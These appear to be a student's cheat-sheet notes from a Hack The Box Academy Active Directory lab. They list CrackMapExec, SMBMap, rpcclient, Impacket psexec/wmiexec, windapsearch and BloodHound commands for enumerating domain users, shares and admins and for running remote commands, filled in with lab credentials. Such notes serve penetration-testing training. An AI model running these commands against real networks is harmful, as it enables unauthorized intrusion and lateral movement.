User=forend and password=Klmcargo2

## CrackMapExec
```shell-session
crackmapexec -h
```
```shell-session
crackmapexec smb -h
```
```shell-session
crackmapexec winrm -h
```

- '-u Username'
- '-p Password'
- Target
- '--users'
- '--groups'
- '--loggedon-users'

**Domain User Enumeration
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

**Domain Group Enumeration
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

**Logged On Users
```shell-session
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

**Share Enumeration - Domain Controller
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

**Spider_plus
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
```

## SMBMap
```shell-session
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

**Recursive List of All Directories
```shell-session
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

## rpcclient
```shell-session
rpcclient -U "" -N 172.16.5.5
queryuser 0x457
enumdomusers
```

## Impacket Toolkit

**psexec.py (need admin credentials)
```shell-session
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

**wmiexec.py
```shell-session
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5 
```

## Windapsearch
```shell-session
windapsearch.py -h
```

**Windapsearch - Domain Admins
```shell-session
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

**Windapsearch - Privileged Users
```shell-session
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

## Bloodhound.py
```shell-session
bloodhound-python -h
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
ls
sudo neo4j start
bloodhound
user == neo4j
pass == HTB_@cademy_stdnt!
zip -r ilfreight_bh.zip *.json
```
- Upload zip file

